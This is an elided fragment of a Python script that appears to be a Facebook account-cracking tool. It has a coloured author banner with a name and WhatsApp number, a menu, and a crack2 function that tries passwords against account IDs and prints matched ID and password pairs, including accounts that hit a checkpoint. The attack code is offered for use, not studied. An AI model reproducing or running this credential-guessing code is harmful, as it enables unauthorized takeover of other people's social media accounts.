...
\x1b[92;1m===================================>\x1b[92;1m
\x1b[93;1m Author       \x1b[92;1m=>      \x1b[93;1mRIZWAN
\x1b[93;1m Whatsapp     \x1b[92;1m=>      \x1b[93;1m+923345478919
\x1b[93;1m Fb Group       \x1b[92;1m=>      \x1b[93;1m@Team-Zaid Rao
\x1b[92;1m===================================>\x1b[92;1m
"""%(h))
...
def menu(): #Bilo
	...
	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
	insane = input(x+'\33[1;96m•Input Number> ')
	if insane in ['1','01']:
		File2()
	elif insane in ['0','00']:
		os.system("xdg-open lmao paste your yt or fb link")
		exit()
	else:
		os.system("lmao paste your yt or fb link")
		exit()
...
def setting():
	...
	if fast in ['y','Y']:
		...
		os.system("xdg-open paste your youtube link")
		exit()
...
def crack2(idf,pwv):
	...
	fff = '%'
	print('\r%s [WAZIR] %s/%s  OK*%s | CP*%s => %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "www.facebook.com" in resp.json()["error_msg"]:
				if 'ya' in oprek:
					...
					print('\r%s [WAZIR-CP] %s|%s        '%(b,idf,pw))
